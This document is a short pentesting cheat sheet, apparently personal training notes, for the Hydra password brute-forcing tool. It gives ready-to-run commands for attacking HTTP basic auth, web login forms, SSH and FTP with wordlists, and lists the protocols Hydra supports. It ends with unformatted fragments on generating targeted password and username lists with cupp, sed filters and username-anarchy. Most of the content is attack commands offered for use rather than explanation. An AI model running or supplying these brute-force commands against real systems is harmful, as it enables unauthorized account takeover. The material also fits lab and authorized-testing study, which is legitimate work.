# Hydra

A brute force online password cracking program; a quick system login password 'hacking' tool. 

```bash
https://github.com/vanhauser-thc/thc-hydra
```

## Hydra Commands

### Hydra Help
```bash
hydra -h
```
### Basic Auth Brute Force

#### Combined Wordlist
```bash
hydra -C wordlist.txt SERVER_IP -s PORT http-get /
```
#### User and Pass Wordlists
```bash
hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /
```
### Login Form Brute Force
#### Static User and Pass Wordlist
```bash
hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
### SSH Brute Force
#### User and Pass Wordlist
```bash
hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4
```
### FTP Brute Force
#### User and Pass Wordlist
```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```

* FTP

```bash
hydra -l user -P <WORDLIST> ftp://10.10.10.10
```

* SSH

```bash
hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 -t 4 ssh
```

* Post Web Form

```bash
hydra -l <USERNAME> -P <WORDLIST> 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```



### Supported Protocols for Brute Force

* Asterisk
* AFP
* Cisco AAA
* Cisco auth
* Cisco enable
* CVS
* Firebird
* FTP
* HTTP-FORM-GET
* HTTP-FORM-POST
* HTTP-GET
* HTTP-HEAD
* HTTP-PROXY
* HTTPS-FORM-GET
* HTTPS-FORM-GET
* HTTPS-GET
* HTTPS-HEAD
* HTTPS-POST
* HTTP-Proxy
* ICQ
* IMAP
* IRC
* LDAP
* MS-SQL
* NCP
* NNTP
* Oracle Listener
* Oracle SID
* Oracle
* PC-Anywhere
* PCNFS
* POP3
* POSTGRES
* RDP
* Rexec
* Rlogin
* Rsh
* RTSP
* SAP/R3
* SIP
* SMB
* SMTP
* SMTP Enum
* SNMP v1+v2+v3
* SOCKS5, SSH (v1 and v2)
* SSHKEY
* Subversion
* Teamspeak (TS@)
* Telnet
* VMware-Auth
* VNC
* XMPP


cupp -i
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Bill Gates > bill.txt
F=<form name='login'

